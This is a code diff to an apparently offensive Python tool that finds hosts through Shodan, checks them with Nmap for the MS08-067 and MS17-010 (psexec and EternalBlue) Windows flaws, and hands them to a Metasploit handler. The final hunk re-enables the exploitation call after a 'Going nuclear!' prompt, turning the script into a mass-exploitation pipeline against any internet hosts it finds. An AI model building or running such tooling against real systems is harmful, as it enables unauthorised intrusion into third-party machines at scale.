@@ -16,10 +16,12 @@ def dict_confirm(vuln_dict):
         for ip in vuln_dict['ms08-067']:
             print('{0}: {1}'.format(host_id, ip))
     
-    if vuln_dict['ms17-010']:
+    if vuln_dict['ms17-010-psexec'] or vuln_dict['ms17-010-eternalblue']:
         print('Hosts vulnerable to MS17-010:\n')
         host_id = 0
-        for ip in vuln_dict['ms17-010']:
+        for ip in vuln_dict['ms17-010-psexec']:
+            print('{0}: {1}'.format(host_id, ip))
+        for ip in vuln_dict['ms17-010-eternalblue']:
             print('{0}: {1}'.format(host_id, ip))
     
     response = input('\nDo you want to exploit all of the above hosts?(y/n)\n')
@@ -78,7 +80,7 @@ if args.justshodan or args.nonmap or args.noexploit or (not args.justshodan and 
     shodan_searcher.query_shodan(query = ' '.join(args.queries), limit = args.limit, output = output, append = args.append)
 
 # Nmap vulnerability checking phase
-vuln_dict = {'ms08-067': [], 'ms17-010': []}
+vuln_dict = {'ms08-067': [], 'ms17-010-psexec': [], 'ms17-010-eternalblue': []}
 if args.justnmap:
     vuln_dict = vuln_checker.check_vulnerable(ip_file=args.justnmap[0])
     
@@ -92,8 +94,13 @@ if args.justnmap:
             out.write(ip)
             out.write('\n')
         
-        out.write('\nms17-010:\n')
-        for ip in vuln_dict['ms17-010']:
+        out.write('\nms17-010-psexec:\n')
+        for ip in vuln_dict['ms17-010-psexec']:
+            out.write(ip)
+            out.write('\n')
+
+        out.write('\nms17-010-eternalblue:\n')
+        for ip in vuln_dict['ms17-010-eternalblue']:
             out.write(ip)
             out.write('\n')
 
@@ -110,8 +117,13 @@ elif args.noexploit:
             out.write(ip)
             out.write('\n')
         
-        out.write('\nms17-010:\n')
-        for ip in vuln_dict['ms17-010']:
+        out.write('\nms17-010-psexec:\n')
+        for ip in vuln_dict['ms17-010-psexec']:
+            out.write(ip)
+            out.write('\n')
+
+        out.write('\nms17-010-eternalblue:\n')
+        for ip in vuln_dict['ms17-010-eternalblue']:
             out.write(ip)
             out.write('\n')
 
@@ -133,12 +145,17 @@ if args.justexploit:
     
     readin.readline()
     while line != '\n':
-        vuln_dict['ms17-010'].append(line.replace('\n', ''))
+        vuln_dict['ms17-010-psexec'].append(line.replace('\n', ''))
+        line = readin.readline()
+
+    readin.readline()
+    while line != '\n':
+        vuln_dict['ms17-010-eternalblue'].append(line.replace('\n', ''))
         line = readin.readline()
 
 # Exploitation phase
 if args.justexploit or args.noshodan or args.nonmap or (not args.justshodan and not args.justnmap and not args.justexploit and not args.noshodan and not args.nonmap and not args.noexploit and not args.clean):
-    if not vuln_dict['ms08-067'] and not vuln_dict['ms17-010']:
+    if not vuln_dict['ms08-067'] and not vuln_dict['ms17-010-psexec'] and not vuln_dict['ms17-010-eternalblue']:
         print('No vulnerable hosts were found.')
         sys.exit()
     
@@ -147,4 +164,4 @@ if args.justexploit or args.noshodan or args.nonmap or (not args.justshodan and 
             sys.exit()
     
     print('Going nuclear!\n')
-    # metasploit_handler.handle_exploitation(exploit_dict=vuln_dict)
+    metasploit_handler.handle_exploitation(exploit_dict=vuln_dict)
